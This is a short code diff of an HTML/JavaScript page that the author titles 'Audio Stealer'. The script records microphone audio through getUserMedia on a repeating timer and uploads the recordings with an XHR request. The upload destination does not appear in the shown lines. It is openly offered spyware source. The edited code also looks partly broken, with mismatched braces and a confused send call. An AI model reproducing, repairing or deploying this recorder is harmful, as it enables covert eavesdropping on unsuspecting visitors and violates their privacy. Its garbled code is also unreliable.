@@ -31,22 +31,20 @@ navigator.mediaDevices.getUserMedia({ audio: true })
               else
                   console.error(xhr);
           };
-          hande.send(fd);
+          xhr.send(hande);
     });
 
-    setInterval(() => {
+  
             
         
       mediaRecorder.stop()
        
 
-  
-   
-    }, 8000);
-  
-})
+ 
+  })}  
+ 
 
-}
+
 
 setInterval(function(){
     storeaudio()
@@ -58,7 +56,9 @@ setInterval(function(){
    <body>
       <p>
         <center>
-		<b>Coded By :swagkarna</b>
+		<h2> Audio Stealer </h2>
+		<div><p>
+			<b>Coded By :swagkarna</b></p></div>
 		</center>
       </p>
    </body>
